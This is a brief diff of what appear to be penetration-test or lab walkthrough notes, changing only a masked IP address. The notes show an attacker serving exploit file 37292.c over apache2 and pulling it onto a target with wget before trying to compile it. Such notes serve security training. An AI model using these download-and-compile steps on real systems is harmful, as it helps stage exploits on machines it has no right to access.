@@ -318,7 +318,7 @@ lets open service -> service apache2 start
 
 and download from our apache2 service
 
-tmp$ wget http://10.0.2.15/37292.c
+tmp$ wget http://10.X.X.X/37292.c
 
 
 gcc 37292.c   -> The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
